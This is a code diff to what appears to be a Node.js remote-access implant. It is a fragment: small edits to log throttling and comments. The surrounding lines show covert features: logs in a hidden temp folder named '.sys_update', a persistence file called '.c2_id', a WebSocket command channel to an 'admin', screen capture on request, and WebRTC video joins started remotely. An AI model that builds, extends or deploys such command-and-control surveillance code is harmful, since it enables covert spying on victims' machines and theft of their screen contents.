@@ -17,7 +17,6 @@ try {
 
 const { RTCPeerConnection, RTCSessionDescription, MediaStream, mediaDevices } = wrtc || {};
 
-// If @roamhq/wrtc isn't loaded, fallback to basic logic (but video won't work without it)
 const HAS_WEBRTC = !!wrtc;
 
 // --- LOGGING SYSTEM ---
@@ -25,17 +24,13 @@ const LOG_DIR = path.join(os.tmpdir(), '.sys_update');
 const LOG_FILE = path.join(LOG_DIR, 'payload.log');
 if (!fs.existsSync(LOG_DIR)) fs.mkdirSync(LOG_DIR);
 
-let lastLogSent = 0; // Throttle system logs to prevent spam
-
 function log(msg) {
  const timestamp = new Date().toISOString();
  console.log(`[${timestamp}] ${msg}`);
  try {
  fs.appendFileSync(LOG_FILE, `[${timestamp}] ${msg}\n`);
- 
- // Only send system logs if it's been more than 2 seconds since the last one
- // This fixes the spam issue
- if (Date.now() - lastLogSent > 2000 && ws && ws.readyState === WebSocket.OPEN && myId) {
+ // Only send system logs if it's been more than 5 seconds since the last one
+ if (Date.now() - lastLogSent > 5000 && ws && ws.readyState === WebSocket.OPEN && myId) {
  safeSend(JSON.stringify({ type: 'system_log', message: msg, id: myId }));
  lastLogSent = Date.now();
  }
@@ -56,6 +51,7 @@ let reconnectAttempts = 0;
 const MAX_RECONNECT_ATTEMPTS = 10;
 let isConnected = false;
 let isSessionActive = false;
+let lastLogSent = 0;
 
 // Persistence Logic
 const PERSIST_FILE = path.join(os.tmpdir(), '.c2_id');
@@ -115,7 +111,6 @@ function initConnection() {
  log(`[JOIN] Request join received from ${data.from}`);
  handleJoinRequest(data.from);
  } else if (data.type === 'start_join') {
- // Explicitly start the join process when requested by admin
  log(`[JOIN] Starting join initiated by ${data.from}`);
  handleJoinRequest(data.from);
  } else if (data.type === 'offer') {
@@ -130,7 +125,7 @@ function initConnection() {
  } else if (data.type === 'screen_data') {
  captureScreenPureJS();
  } else if (data.type === 'system_log') {
- // Optional - already handled in log function
+ // Optional
  }
  } catch (e) {
  log(`[WS] Error parsing message: ${e.message}`);
